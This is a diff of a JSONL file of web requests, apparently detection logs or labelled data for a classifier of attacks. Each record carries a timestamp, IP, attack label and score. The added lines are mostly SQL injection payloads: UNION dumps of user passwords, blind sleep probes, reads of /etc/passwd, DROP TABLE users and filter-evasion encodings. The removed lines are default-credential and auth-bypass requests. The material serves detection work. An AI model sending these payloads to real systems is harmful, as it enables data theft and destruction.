@@ -1,20 +1,329 @@
-{"label": "Broken Authentication", "probability": 99.7, "url": "/auth/login", "body": "username=admin&password=admin"}
-{"label": "Broken Authentication", "probability": 99.88, "url": "/auth/login", "body": "username=root&password=root"}
-{"label": "Broken Authentication", "probability": 99.55, "url": "/auth/login", "body": "username=test&password=123456"}
-{"label": "Broken Authentication", "probability": 99.94, "url": "/auth/session?uid=1", "body": ""}
-{"label": "Broken Authentication", "probability": 99.49, "url": "/admin?token=123456", "body": ""}
-{"label": "Broken Authentication", "probability": 99.91, "url": "/panel?override=true", "body": ""}
-{"label": "Broken Authentication", "probability": 99.96, "url": "/login?session=abc123", "body": ""}
-{"label": "Broken Authentication", "probability": 99.69, "url": "/api/session/restore", "body": "session=admin123"}
-{"label": "Broken Authentication", "probability": 99.92, "url": "/user/1/edit?uid=1", "body": ""}
-{"label": "Broken Authentication", "probability": 99.93, "url": "/admin/login-as?user=admin", "body": ""}
-{"label": "Broken Authentication", "probability": 98.14, "url": "/api/auth", "body": "{\"sid\":\"111111\"}"}
-{"label": "Broken Authentication", "probability": 81.03, "url": "/api/auth", "body": "{\"session\":\"abcd1234\"}"}
-{"label": "Broken Authentication", "probability": 97.59, "url": "/api/login", "body": "{\"user\":\"admin\",\"otp\":\"000000\"}"}
-{"label": "Broken Authentication", "probability": 98.52, "url": "/api/login", "body": "{\"user\":\"root\",\"otp\":\"111111\"}"}
-{"label": "Broken Authentication", "probability": 99.93, "url": "/reset?token=111111", "body": ""}
-{"label": "Broken Authentication", "probability": 99.95, "url": "/token/refresh", "body": "token=abcdef"}
-{"label": "Broken Authentication", "probability": 99.95, "url": "/token/refresh", "body": "token=zzzzzz"}
-{"label": "Broken Authentication", "probability": 99.96, "url": "/auth/bypass?admin=1", "body": ""}
-{"label": "Broken Authentication", "probability": 99.54, "url": "/panel?uid=1&role=admin", "body": ""}
-{"label": "Broken Authentication", "probability": 99.93, "url": "/debug/login-as?user=superadmin", "body": ""}
+{"time": "2025-08-10T11:20:19+00:00", "ip": "172.18.0.12", "attack": "Broken Authentication", "score": 51.49, "url": "/login?id=1' OR '1'='1", "body": "username=admin"}
+{"time": "2025-01-28T02:48:11+00:00", "ip": "10.0.0.21", "attack": "SQL Injection", "score": 52.83, "url": "/search?q=test' OR '1'='1", "body": "filter=all"}
+{"time": "2025-02-15T13:09:51+00:00", "ip": "172.20.1.5", "attack": "SQL Injection", "score": 89.94, "url": "/profile?id=5 AND 1=1", "body": "view=full"}
+{"time": "2025-04-22T05:14:33+00:00", "ip": "192.168.1.44", "attack": "SQL Injection", "score": 99.84, "url": "/item?id=10 UNION SELECT 1,2,3", "body": "mode=json"}
+{"time": "2025-07-12T23:17:10+00:00", "ip": "172.18.0.77", "attack": "SQL Injection", "score": 99.9, "url": "/product?id=10 UNION SELECT username,password FROM users--", "body": "q=test"}
+{"time": "2025-05-03T10:30:42+00:00", "ip": "10.10.0.88", "attack": "SQL Injection", "score": 96.68, "url": "/api/user?id=1' AND '1'='1", "body": "debug=true"}
+{"time": "2025-06-08T09:27:41+00:00", "ip": "172.18.0.99", "attack": "SQL Injection", "score": 95.66, "url": "/api/search?q=test'#", "body": "none="}
+{"time": "2025-10-30T14:55:03+00:00", "ip": "192.168.10.10", "attack": "SQL Injection", "score": 82.01, "url": "/check?id=1 OR TRUE-- -", "body": "v=1"}
+{"time": "2025-05-27T07:40:11+00:00", "ip": "172.20.0.9", "attack": "SQL Injection", "score": 85.9, "url": "/find?id=2 OR 2>1-- -", "body": "x=1"}
+{"time": "2025-02-01T09:20:21+00:00", "ip": "10.0.0.100", "attack": "SQL Injection", "score": 94.42, "url": "/view?id=7' OR 'abc'='abc", "body": "ref=home"}
+{"time": "2025-01-11T12:12:12+00:00", "ip": "172.19.1.5", "attack": "SQL Injection", "score": 59.9, "url": "/details?id=3') OR ('1'='1", "body": "lang=en"}
+{"time": "2025-03-22T22:33:09+00:00", "ip": "172.18.5.33", "attack": "SQL Injection", "score": 86.24, "url": "/list?id=1)) OR ((1=1", "body": "foo=bar"}
+{"time": "2025-07-19T10:03:44+00:00", "ip": "192.168.2.55", "attack": "SQL Injection", "score": 76.87, "url": "/login?id=1 OR sleep(1)-- -", "body": "a=1"}
+{"time": "2025-03-18T11:44:31+00:00", "ip": "10.1.1.25", "attack": "SQL Injection", "score": 99.44, "url": "/query?id=4' AND sleep(2)-- -", "body": "k=1"}
+{"time": "2025-09-12T19:30:55+00:00", "ip": "172.18.0.65", "attack": "SQL Injection", "score": 99.38, "url": "/product?id=1' AND SLEEP(5)-- -", "body": "t=1"}
+{"time": "2025-11-01T16:55:55+00:00", "ip": "172.20.4.10", "attack": "SQL Injection", "score": 99.93, "url": "/api?u=test' AND IF(1=1, SLEEP(2), 0)-- -", "body": "mode=slow"}
+{"time": "2025-06-14T08:21:10+00:00", "ip": "172.18.0.80", "attack": "SQL Injection", "score": 99.98, "url": "/api?id=0 UNION SELECT NULL,NULL,NULL-- -", "body": "debug=yes"}
+{"time": "2025-04-04T07:49:33+00:00", "ip": "192.168.0.77", "attack": "SQL Injection", "score": 99.95, "url": "/search?category=1 UNION SELECT table_name,NULL FROM information_schema.tables-- -", "body": "dump=true"}
+{"time": "2025-01-18T14:11:42+00:00", "ip": "172.16.5.9", "attack": "SQL Injection", "score": 99.94, "url": "/search?item=1 UNION SELECT column_name,NULL FROM information_schema.columns-- -", "body": "dump=true"}
+{"time": "2025-08-19T13:40:22+00:00", "ip": "172.18.0.40", "attack": "SQL Injection", "score": 99.96, "url": "/data?id=9 AND (SELECT COUNT(*) FROM users)>0", "body": "check=true"}
+{"time": "2025-05-14T02:31:14+00:00", "ip": "10.0.2.66", "attack": "SQL Injection", "score": 93.12, "url": "/login?user=admin' AND LENGTH(password)>0-- -", "body": "try=1"}
+{"time": "2025-03-09T11:22:55+00:00", "ip": "192.168.1.102", "attack": "SQL Injection", "score": 98.91, "url": "/login?user=admin' AND ASCII(SUBSTR(password,1,1))>50-- -", "body": "a=1"}
+{"time": "2025-07-22T17:11:44+00:00", "ip": "172.17.5.100", "attack": "SQL Injection", "score": 99.21, "url": "/login?user=admin' AND BENCHMARK(1000000,MD5(1))-- -", "body": "test=1"}
+{"time": "2025-02-28T09:00:20+00:00", "ip": "192.168.3.12", "attack": "SQL Injection", "score": 99.95, "url": "/api/v1?x=1' OR extractvalue(1,concat(0x7e,(SELECT database())))-- -", "body": "none="}
+{"time": "2025-06-10T07:13:05+00:00", "ip": "10.10.1.77", "attack": "SQL Injection", "score": 99.7, "url": "/api/v1?x=1 OR updatexml(1,concat(0x7e,database()),1)", "body": "none="}
+{"time": "2025-04-05T22:44:12+00:00", "ip": "172.18.0.11", "attack": "SQL Injection", "score": 99.93, "url": "/filter?cat=1') UNION SELECT @@version,NULL-- -", "body": "info=1"}
+{"time": "2025-01-26T18:22:31+00:00", "ip": "172.16.2.88", "attack": "SQL Injection", "score": 99.68, "url": "/login?id=1' UNION SELECT load_file('/etc/passwd'),NULL-- -", "body": "read=true"}
+{"time": "2025-11-28T12:02:01Z", "ip": "10.2.0.1", "attack": "Broken Authentication", "score": 61.38, "url": "/user?id=1'%20OR%201=1--%20", "body": ""}
+{"time": "2025-11-28T12:02:02Z", "ip": "10.2.0.2", "attack": "Broken Authentication", "score": 93.63, "url": "/login?user=admin'%20--", "body": ""}
+{"time": "2025-11-28T12:02:03Z", "ip": "10.2.0.3", "attack": "SQL Injection", "score": 75.41, "url": "/search?q=abc'%20OR%20'1'='1", "body": ""}
+{"time": "2025-11-28T12:02:04Z", "ip": "10.2.0.4", "attack": "SQL Injection", "score": 99.72, "url": "/product?id=10%20UNION%20SELECT%201,2,3", "body": ""}
+{"time": "2025-11-28T12:02:05Z", "ip": "10.2.0.5", "attack": "Broken Authentication", "score": 63.71, "url": "/api/find?id=5%20OR%20TRUE--", "body": ""}
+{"time": "2025-11-28T12:02:06Z", "ip": "10.2.0.6", "attack": "SQL Injection", "score": 67.91, "url": "/auth", "body": "u=admin' OR 1=1--&p=x"}
+{"time": "2025-11-28T12:02:07Z", "ip": "10.2.0.7", "attack": "Broken Authentication", "score": 56.78, "url": "/profile?id=4%20AND%201=1", "body": ""}
+{"time": "2025-11-28T12:02:08Z", "ip": "10.2.0.8", "attack": "SQL Injection", "score": 84.13, "url": "/api/x?q=%27%20OR%201=1%20--%20", "body": ""}
+{"time": "2025-11-28T12:02:09Z", "ip": "10.2.0.9", "attack": "Broken Authentication", "score": 57.11, "url": "/detail?id=1')%20OR%20('1'='1", "body": ""}
+{"time": "2025-11-28T12:02:10Z", "ip": "10.2.0.10", "attack": "SQL Injection", "score": 88.76, "url": "/info?id=9))%20OR%20((1=1", "body": ""}
+{"time": "2025-11-28T12:02:11Z", "ip": "10.2.0.11", "attack": "Broken Authentication", "score": 74.61, "url": "/check?id=2%20OR%202>1--", "body": ""}
+{"time": "2025-11-28T12:02:12Z", "ip": "10.2.0.12", "attack": "SQL Injection", "score": 93.43, "url": "/view?id=5'%20OR%20'xyz'='xyz", "body": ""}
+{"time": "2025-11-28T12:02:13Z", "ip": "10.2.0.13", "attack": "SQL Injection", "score": 96.89, "url": "/time?id=3%20AND%20SLEEP(1)--", "body": ""}
+{"time": "2025-11-28T12:02:14Z", "ip": "10.2.0.14", "attack": "SQL Injection", "score": 98.8, "url": "/time?id=2'%20AND%20SLEEP(4)--", "body": ""}
+{"time": "2025-11-28T12:02:15Z", "ip": "10.2.0.15", "attack": "SQL Injection", "score": 99.83, "url": "/time?id=1'%20AND%20IF(1=1,SLEEP(2),0)--", "body": ""}
+{"time": "2025-11-28T12:02:16Z", "ip": "10.2.0.16", "attack": "Broken Authentication", "score": 95.51, "url": "/data?id=3/**/OR/**/1=1", "body": ""}
+{"time": "2025-11-28T12:02:17Z", "ip": "10.2.0.17", "attack": "Broken Authentication", "score": 95.39, "url": "/data?id=3/*!OR*/1=1", "body": ""}
+{"time": "2025-11-28T12:02:18Z", "ip": "10.2.0.18", "attack": "SQL Injection", "score": 77.98, "url": "/panel?id=3%27%20OR%201=1--", "body": ""}
+{"time": "2025-11-28T12:02:19Z", "ip": "10.2.0.19", "attack": "Broken Authentication", "score": 51.3, "url": "/panel?id=1%22%20OR%20%221%22=%221--", "body": ""}
+{"time": "2025-11-28T12:02:20Z", "ip": "10.2.0.20", "attack": "Broken Authentication", "score": 54.04, "url": "/auth?id=1%20OR%20'A'='A'#", "body": ""}
+{"time": "2025-11-28T12:02:21Z", "ip": "10.2.0.21", "attack": "SQL Injection", "score": 98.82, "url": "/lab?id=4'||(SELECT 1)", "body": ""}
+{"time": "2025-11-28T12:02:22Z", "ip": "10.2.0.22", "attack": "SQL Injection", "score": 99.16, "url": "/lab?id=7'||(SELECT NULL)", "body": ""}
+{"time": "2025-11-28T12:02:23Z", "ip": "10.2.0.23", "attack": "SQL Injection", "score": 99.84, "url": "/x?id=9%20UNION%20SELECT%20version(),NULL", "body": ""}
+{"time": "2025-11-28T12:02:24Z", "ip": "10.2.0.24", "attack": "SQL Injection", "score": 99.86, "url": "/x?id=8%20UNION%20SELECT%20database(),NULL", "body": ""}
+{"time": "2025-11-28T12:02:25Z", "ip": "10.2.0.25", "attack": "SQL Injection", "score": 99.7, "url": "/x?id=2%20UNION%20SELECT%20user(),NULL", "body": ""}
+{"time": "2025-11-28T12:02:26Z", "ip": "10.2.0.26", "attack": "SQL Injection", "score": 93.38, "url": "/extract?id=10%20OR%20extractvalue(1,concat(0x7e,user()))", "body": ""}
+{"time": "2025-11-28T12:02:27Z", "ip": "10.2.0.27", "attack": "SQL Injection", "score": 94.4, "url": "/extract?id=10%20OR%20updatexml(1,concat(0x7e,database()),1)", "body": ""}
+{"time": "2025-11-28T12:02:28Z", "ip": "10.2.0.28", "attack": "SQL Injection", "score": 98.59, "url": "/json?id=1'%20AND%20JSON_KEYS('{\"a\":1}')%20IS%20NOT%20NULL--", "body": ""}
+{"time": "2025-11-28T12:02:29Z", "ip": "10.2.0.29", "attack": "SQL Injection", "score": 90.65, "url": "/json?id=1'%20AND%20JSON_VALID('{\"a\":1}')--", "body": ""}
+{"time": "2025-11-28T12:02:30Z", "ip": "10.2.0.30", "attack": "SQL Injection", "score": 96.07, "url": "/json?id=2'%20AND%20REGEXP_LIKE('abc','^a')--", "body": ""}
+{"time": "2025-11-28T12:02:31Z", "ip": "10.2.0.31", "attack": "SQL Injection", "score": 99.92, "url": "/reg?id=2'%20AND%20(SELECT%20substr('abc',1,1))='a'--", "body": ""}
+{"time": "2025-11-28T12:02:32Z", "ip": "10.2.0.32", "attack": "SQL Injection", "score": 99.89, "url": "/reg?id=2'%20AND%20(SELECT%20ascii(substr('abc',1,1)))>50--", "body": ""}
+{"time": "2025-11-28T12:02:33Z", "ip": "10.2.0.33", "attack": "SQL Injection", "score": 82.73, "url": "/adv?id=1%20AND%201=(SELECT%201)", "body": ""}
+{"time": "2025-11-28T12:02:34Z", "ip": "10.2.0.34", "attack": "SQL Injection", "score": 99.95, "url": "/adv?id=4%20AND%20(SELECT%20sleep(1))", "body": ""}
+{"time": "2025-11-28T12:02:35Z", "ip": "10.2.0.35", "attack": "SQL Injection", "score": 97.73, "url": "/adv?id=5%20AND%20CASE%20WHEN%201=1%20THEN%20sleep(1)%20END", "body": ""}
+{"time": "2025-11-28T12:02:36Z", "ip": "10.2.0.36", "attack": "SQL Injection", "score": 84.88, "url": "/category?id=5'%20OR%201%20GROUP%20BY%201--", "body": ""}
+{"time": "2025-11-28T12:02:37Z", "ip": "10.2.0.37", "attack": "SQL Injection", "score": 99.91, "url": "/data?id=5'%20GROUP%20BY%20concat(0x7e,(SELECT%201),0x7e)", "body": ""}
+{"time": "2025-11-28T12:02:38Z", "ip": "10.2.0.38", "attack": "SQL Injection", "score": 99.37, "url": "/extract2?id=10%20OR%20extractvalue(1,concat(0x5c,(SELECT%20user())))", "body": ""}
+{"time": "2025-11-28T12:02:39Z", "ip": "10.2.0.39", "attack": "SQL Injection", "score": 99.95, "url": "/extract2?id=10%20OR%20updatexml(1,concat(0x5c,(SELECT%20database())),1)", "body": ""}
+{"time": "2025-11-28T12:02:40Z", "ip": "10.2.0.40", "attack": "SQL Injection", "score": 95.82, "url": "/api?c=1' AND JSON_LENGTH('{\"x\":1}')=1--", "body": ""}
+{"time": "2025-11-28T12:02:41Z", "ip": "10.2.0.41", "attack": "SQL Injection", "score": 99.66, "url": "/api?c=1' AND JSON_EXTRACT('{\"x\":9}','$.x')=9--", "body": ""}
+{"time": "2025-11-28T12:02:42Z", "ip": "10.2.0.42", "attack": "SQL Injection", "score": 98.94, "url": "/filter?id=7'%20OR%20JSON_TYPE('{\"a\":1}','$.a')='NUMBER'--", "body": ""}
+{"time": "2025-11-28T12:02:43Z", "ip": "10.2.0.43", "attack": "Broken Authentication", "score": 91.83, "url": "/order?id=1'%20ORDER%20BY%201--", "body": ""}
+{"time": "2025-11-28T12:02:44Z", "ip": "10.2.0.44", "attack": "Broken Authentication", "score": 91.83, "url": "/order?id=1'%20ORDER%20BY%203--", "body": ""}
+{"time": "2025-11-28T12:02:45Z", "ip": "10.2.0.45", "attack": "SQL Injection", "score": 98.63, "url": "/union?id=1'%20UNION%20SELECT%201,2--", "body": ""}
+{"time": "2025-11-28T12:02:46Z", "ip": "10.2.0.46", "attack": "SQL Injection", "score": 99.83, "url": "/union?id=1'%20UNION%20SELECT%201,2,3--", "body": ""}
+{"time": "2025-11-28T12:02:47Z", "ip": "10.2.0.47", "attack": "SQL Injection", "score": 99.87, "url": "/union?id=1'%20UNION%20SELECT%201,2,3,4--", "body": ""}
+{"time": "2025-11-28T12:02:48Z", "ip": "10.2.0.48", "attack": "Broken Authentication", "score": 84.92, "url": "/bool?id=2%20AND%20TRUE", "body": ""}
+{"time": "2025-11-28T12:02:49Z", "ip": "10.2.0.49", "attack": "Broken Authentication", "score": 88.17, "url": "/bool?id=2%20AND%20FALSE", "body": ""}
+{"time": "2025-11-28T12:02:50Z", "ip": "10.2.0.50", "attack": "SQL Injection", "score": 92.08, "url": "/bool?id=2%20AND%20'A'='A'", "body": ""}
+{"time": "2025-11-28T12:02:51Z", "ip": "10.2.0.51", "attack": "Broken Authentication", "score": 81.12, "url": "/like?id=3%20AND%202%20LIKE%202", "body": ""}
+{"time": "2025-11-28T12:02:52Z", "ip": "10.2.0.52", "attack": "Broken Authentication", "score": 60.63, "url": "/like?id=3%20AND%202%20LIKE%20'2'", "body": ""}
+{"time": "2025-11-28T12:02:53Z", "ip": "10.2.0.53", "attack": "SQL Injection", "score": 88.91, "url": "/compare?id=10%20AND%20CHAR_LENGTH('abc')=3", "body": ""}
+{"time": "2025-11-28T12:02:54Z", "ip": "10.2.0.54", "attack": "SQL Injection", "score": 90.78, "url": "/compare?id=10%20AND%20LENGTH('aaa')=3", "body": ""}
+{"time": "2025-11-28T12:02:55Z", "ip": "10.2.0.55", "attack": "Broken Authentication", "score": 88.77, "url": "/hex?id=0x61646d696e=0x61646d696e", "body": ""}
+{"time": "2025-11-28T12:02:56Z", "ip": "10.2.0.56", "attack": "SQL Injection", "score": 86.35, "url": "/encoded?id=%2527%2520OR%25201=1--", "body": ""}
+{"time": "2025-11-28T12:02:57Z", "ip": "10.2.0.57", "attack": "SQL Injection", "score": 86.35, "url": "/encoded?id=%27%20OR%201=1--", "body": ""}
+{"time": "2025-11-28T12:02:58Z", "ip": "10.2.0.58", "attack": "Broken Authentication", "score": 99.11, "url": "/multi?id=%256f%2572%25", "body": ""}
+{"time": "2025-11-28T12:02:59Z", "ip": "10.2.0.59", "attack": "Broken Authentication", "score": 99.44, "url": "/inject?id=%6f%72", "body": ""}
+{"time": "2025-11-28T12:03:00Z", "ip": "10.2.0.60", "attack": "Broken Authentication", "score": 99.56, "url": "/double?id=%25%36%66%25%36%39", "body": ""}
+{"time": "2025-11-28T12:03:01Z", "ip": "10.2.0.61", "attack": "Broken Authentication", "score": 95.54, "url": "/weird?id=%C0%BC%27OR%271=1", "body": ""}
+{"time": "2025-11-28T12:03:02Z", "ip": "10.2.0.62", "attack": "Broken Authentication", "score": 97.55, "url": "/broken?id=%BF%27OR%271=1", "body": ""}
+{"time": "2025-11-28T12:03:03Z", "ip": "10.2.0.63", "attack": "SQL Injection", "score": 94.42, "url": "/api/v2/user?id=1;SELECT%201", "body": ""}
+{"time": "2025-11-28T12:03:04Z", "ip": "10.2.0.64", "attack": "SQL Injection", "score": 89.83, "url": "/api/v2/user?id=1;%20DROP%20TABLE%20users", "body": ""}
+{"time": "2025-11-28T12:03:05Z", "ip": "10.2.0.65", "attack": "Broken Authentication", "score": 98.77, "url": "/dump?id=3;%20SHOW%20DATABASES", "body": ""}
+{"time": "2025-11-28T12:03:06Z", "ip": "10.2.0.66", "attack": "Broken Authentication", "score": 86.01, "url": "/dump?id=3;%20SHOW%20TABLES", "body": ""}
+{"time": "2025-11-28T12:03:07Z", "ip": "10.2.0.67", "attack": "Broken Authentication", "score": 94.28, "url": "/waf?id=1%2F**%2For%2F**%2F1=1", "body": ""}
+{"time": "2025-11-28T12:03:08Z", "ip": "10.2.0.68", "attack": "SQL Injection", "score": 86.83, "url": "/json2?item=1'%20OR%20CAST('1'%20AS%20SIGNED)=1", "body": ""}
+{"time": "2025-11-28T12:03:09Z", "ip": "10.2.0.69", "attack": "SQL Injection", "score": 99.06, "url": "/time2?id=1'%20AND%20pg_sleep(2)--", "body": ""}
+{"time": "2025-11-28T12:03:10Z", "ip": "10.2.0.70", "attack": "SQL Injection", "score": 88.24, "url": "/pg?id=1;SELECT%20pg_read_file('/etc/passwd')", "body": ""}
+{"time": "2025-11-28T12:03:11Z", "ip": "10.2.0.71", "attack": "SQL Injection", "score": 99.96, "url": "/oracle?id=1'%20OR%20EXISTS(SELECT%201%20FROM%20dual)--", "body": ""}
+{"time": "2025-11-28T12:03:12Z", "ip": "10.2.0.72", "attack": "SQL Injection", "score": 98.29, "url": "/mysql?id=1'%20OR%20@@version%20IS%20NOT%20NULL--", "body": ""}
+{"time": "2025-11-28T12:03:13Z", "ip": "10.2.0.73", "attack": "SQL Injection", "score": 99.95, "url": "/big?id=1'%20UNION%20SELECT%20NULL,NULL,NULL,NULL,NULL--", "body": ""}
+{"time": "2025-11-28T12:03:14Z", "ip": "10.2.0.74", "attack": "SQL Injection", "score": 99.97, "url": "/deep?id=1'%20AND%20(SELECT%20COUNT(*)%20FROM%20users)>0--", "body": ""}
+{"time": "2025-11-28T12:03:15Z", "ip": "10.2.0.75", "attack": "SQL Injection", "score": 99.96, "url": "/deep?id=1'%20AND%20(SELECT%20email%20FROM%20users%20LIMIT%201)='admin'--", "body": ""}
+{"time": "2025-11-28T12:03:16Z", "ip": "10.2.0.76", "attack": "Broken Authentication", "score": 87.11, "url": "/xor?id=1'%20XOR%201=1", "body": ""}
+{"time": "2025-11-28T12:03:17Z", "ip": "10.2.0.77", "attack": "SQL Injection", "score": 99.61, "url": "/complex?id=1'%20AND%20(IF(1=1,md5(1),0))--", "body": ""}
+{"time": "2025-11-28T12:03:18Z", "ip": "10.2.0.78", "attack": "SQL Injection", "score": 99.01, "url": "/complex?id=1'%20AND%20(SELECT%20hex(user()))", "body": ""}
+{"time": "2025-11-28T12:03:19Z", "ip": "10.2.0.79", "attack": "Broken Authentication", "score": 95.15, "url": "/weird2?id=%EF%BF%BD%27OR%271=1", "body": ""}
+{"time": "2025-11-28T12:03:20Z", "ip": "10.2.0.80", "attack": "Broken Authentication", "score": 97.23, "url": "/weird2?id=%E0%80%AF%27OR%271=1", "body": ""}
+{"time": "2025-11-28T12:03:21Z", "ip": "10.2.0.81", "attack": "SQL Injection", "score": 71.56, "url": "/case?id=1'%20AND%20CASE%20WHEN%201=1%20THEN%201%20ELSE%200%20END=1", "body": ""}
+{"time": "2025-11-28T12:03:22Z", "ip": "10.2.0.82", "attack": "SQL Injection", "score": 79.31, "url": "/alias?id=1'%20OR%20CONCAT('a','b')='ab'", "body": ""}
+{"time": "2025-11-28T12:03:23Z", "ip": "10.2.0.83", "attack": "SQL Injection", "score": 99.51, "url": "/jsonin?id=1'%20OR%20JSON_EXTRACT('{\"a\":1}','$.a')=1--", "body": ""}
+{"time": "2025-11-28T12:03:24Z", "ip": "10.2.0.84", "attack": "SQL Injection", "score": 99.57, "url": "/array?id=1'%20OR%20JSON_EXTRACT('[1,2,3]','$[0]')=1--", "body": ""}
+{"time": "2025-11-28T12:03:25Z", "ip": "10.2.0.85", "attack": "SQL Injection", "score": 99.94, "url": "/xml?id=1'%20OR%20updatexml(1,'~',(SELECT%20user()))", "body": ""}
+{"time": "2025-11-28T12:03:26Z", "ip": "10.2.0.86", "attack": "SQL Injection", "score": 98.57, "url": "/sub?id=1'%20OR%20substring('abc',1,1)='a'", "body": ""}
+{"time": "2025-11-28T12:03:27Z", "ip": "10.2.0.87", "attack": "SQL Injection", "score": 94.77, "url": "/ascii?id=1'%20OR%20ascii('A')=65", "body": ""}
+{"time": "2025-11-28T12:03:28Z", "ip": "10.2.0.88", "attack": "SQL Injection", "score": 92.59, "url": "/rand?id=1'%20OR%20RAND()%3c0.9", "body": ""}
+{"time": "2025-11-28T12:03:29Z", "ip": "10.2.0.89", "attack": "SQL Injection", "score": 90.89, "url": "/math?id=1'%20OR%20(2*3)=6", "body": ""}
+{"time": "2025-11-28T12:03:30Z", "ip": "10.2.0.90", "attack": "Broken Authentication", "score": 99.59, "url": "/multihex?id=0x41=0x41", "body": ""}
+{"time": "2025-11-28T12:03:31Z", "ip": "10.2.0.91", "attack": "SQL Injection", "score": 99.96, "url": "/doublein?id=1'%20OR%20(SELECT%20(SELECT%201))=1", "body": ""}
+{"time": "2025-11-28T12:03:32Z", "ip": "10.2.0.92", "attack": "SQL Injection", "score": 97.63, "url": "/jsonsql?id=1'%20OR%20JSON_CONTAINS('[1,2,3]',1)--", "body": ""}
+{"time": "2025-11-28T12:03:33Z", "ip": "10.2.0.93", "attack": "SQL Injection", "score": 89.94, "url": "/boolsql?id=1'%20or%20'1'%3d'1", "body": ""}
+{"time": "2025-11-28T12:03:34Z", "ip": "10.2.0.94", "attack": "SQL Injection", "score": 99.17, "url": "/mediumsleep?id=1'%20AND%20sleep(0.3)--", "body": ""}
+{"time": "2025-11-28T12:03:35Z", "ip": "10.2.0.95", "attack": "Broken Authentication", "score": 89.05, "url": "/stacked?id=1;%20SELECT%201", "body": ""}
+{"time": "2025-11-28T12:03:36Z", "ip": "10.2.0.96", "attack": "SQL Injection", "score": 98.86, "url": "/stacked?id=1;%20SELECT%20version()", "body": ""}
+{"time": "2025-11-28T12:03:37Z", "ip": "10.2.0.97", "attack": "SQL Injection", "score": 99.42, "url": "/payload?id=1'%20AND%20MD5(1)='c4ca4238a0b923820dcc509a6f75849b'", "body": ""}
+{"time": "2025-11-28T12:03:38Z", "ip": "10.2.0.98", "attack": "SQL Injection", "score": 98.94, "url": "/payload2?id=1'%20AND%20SHA1('a')='86f7e437faa5a7fce15d1ddcb9eaeaea377667b8'", "body": ""}
+{"time": "2025-11-28T12:03:39Z", "ip": "10.2.0.99", "attack": "SQL Injection", "score": 99.25, "url": "/deepjson?id=1'%20OR%20JSON_EXTRACT('{\"x\":{\"y\":5}}','$.x.y')=5--", "body": ""}
+{"time": "2025-11-28T12:03:40Z", "ip": "10.2.0.100", "attack": "SQL Injection", "score": 99.96, "url": "/final?id=1'%20OR%20(SELECT%20COUNT(*)%20FROM%20admin)>0--", "body": ""}
+{"time": "2025-11-28T12:10:01Z", "ip": "10.3.0.1", "attack": "SQL Injection", "score": 81.91, "url": "/login?id=1'%20OR%20'abc'='abc'--", "body": ""}
+{"time": "2025-11-28T12:10:02Z", "ip": "10.3.0.2", "attack": "SQL Injection", "score": 66.68, "url": "/login?id=%27%20OR%20%271%27=%271", "body": ""}
+{"time": "2025-11-28T12:10:03Z", "ip": "10.3.0.3", "attack": "SQL Injection", "score": 94.42, "url": "/login?id=1%27%20OR%20sleep(2)--", "body": ""}
+{"time": "2025-11-28T12:10:04Z", "ip": "10.3.0.4", "attack": "SQL Injection", "score": 67.68, "url": "/check?id=5'%20OR%201=1--", "body": ""}
+{"time": "2025-11-28T12:10:05Z", "ip": "10.3.0.5", "attack": "SQL Injection", "score": 74.03, "url": "/check?id=5'%20OR%201=2--", "body": ""}
+{"time": "2025-11-28T12:10:06Z", "ip": "10.3.0.6", "attack": "Broken Authentication", "score": 65.75, "url": "/find?q=a'%20OR%201=1--", "body": ""}
+{"time": "2025-11-28T12:10:07Z", "ip": "10.3.0.7", "attack": "SQL Injection", "score": 82.23, "url": "/find?q=%27%20OR%20%271%27=%271--", "body": ""}
+{"time": "2025-11-28T12:10:08Z", "ip": "10.3.0.8", "attack": "Broken Authentication", "score": 83.96, "url": "/product?id=7%20OR%201=1", "body": ""}
+{"time": "2025-11-28T12:10:09Z", "ip": "10.3.0.9", "attack": "Broken Authentication", "score": 86.83, "url": "/product?id=0%20OR%200=0", "body": ""}
+{"time": "2025-11-28T12:10:10Z", "ip": "10.3.0.10", "attack": "Broken Authentication", "score": 94.53, "url": "/user?id=10%20AND%20TRUE", "body": ""}
+{"time": "2025-11-28T12:10:11Z", "ip": "10.3.0.11", "attack": "Broken Authentication", "score": 94.09, "url": "/user?id=10%20AND%20FALSE", "body": ""}
+{"time": "2025-11-28T12:10:12Z", "ip": "10.3.0.12", "attack": "SQL Injection", "score": 62.75, "url": "/item?id=3%27%29%20OR%20%28%271%27=%271", "body": ""}
+{"time": "2025-11-28T12:10:13Z", "ip": "10.3.0.13", "attack": "Broken Authentication", "score": 68.49, "url": "/item?id=3)%20OR%20(1=1", "body": ""}
+{"time": "2025-11-28T12:10:14Z", "ip": "10.3.0.14", "attack": "SQL Injection", "score": 61.07, "url": "/details?id=1%20OR%201%20IN(SELECT%201)", "body": ""}
+{"time": "2025-11-28T12:10:15Z", "ip": "10.3.0.15", "attack": "SQL Injection", "score": 99.65, "url": "/details?id=7%20OR%201%20IN(SELECT%20*%20FROM%20users)", "body": ""}
+{"time": "2025-11-28T12:10:16Z", "ip": "10.3.0.16", "attack": "SQL Injection", "score": 99.48, "url": "/api?x=1'%20OR%20JSON_EXTRACT('{\"x\":1}','$.x')=1--", "body": ""}
+{"time": "2025-11-28T12:10:17Z", "ip": "10.3.0.17", "attack": "SQL Injection", "score": 99.35, "url": "/api?x=1'%20OR%20JSON_TYPE('{\"y\":9}','$.y')='NUMBER'--", "body": ""}
+{"time": "2025-11-28T12:10:18Z", "ip": "10.3.0.18", "attack": "SQL Injection", "score": 99.54, "url": "/filter?id=1'%20UNION%20SELECT%201,2", "body": ""}
+{"time": "2025-11-28T12:10:19Z", "ip": "10.3.0.19", "attack": "SQL Injection", "score": 99.86, "url": "/filter?id=1'%20UNION%20SELECT%201,2,3", "body": ""}
+{"time": "2025-11-28T12:10:20Z", "ip": "10.3.0.20", "attack": "SQL Injection", "score": 99.94, "url": "/auth?id=1'%20UNION%20SELECT%20user(),database()", "body": ""}
+{"time": "2025-11-28T12:10:21Z", "ip": "10.3.0.21", "attack": "SQL Injection", "score": 95.31, "url": "/info?id=5'%20OR%20EXTRACTVALUE(1,concat(0x7e,user()))", "body": ""}
+{"time": "2025-11-28T12:10:22Z", "ip": "10.3.0.22", "attack": "SQL Injection", "score": 98.27, "url": "/info?id=5'%20OR%20updatexml(1,concat(0x7e,database()),1)", "body": ""}
+{"time": "2025-11-28T12:10:23Z", "ip": "10.3.0.23", "attack": "Broken Authentication", "score": 69.16, "url": "/dump?id=3'%20OR%20@@version", "body": ""}
+{"time": "2025-11-28T12:10:24Z", "ip": "10.3.0.24", "attack": "Broken Authentication", "score": 98.77, "url": "/dump?id=3;%20SHOW%20DATABASES", "body": ""}
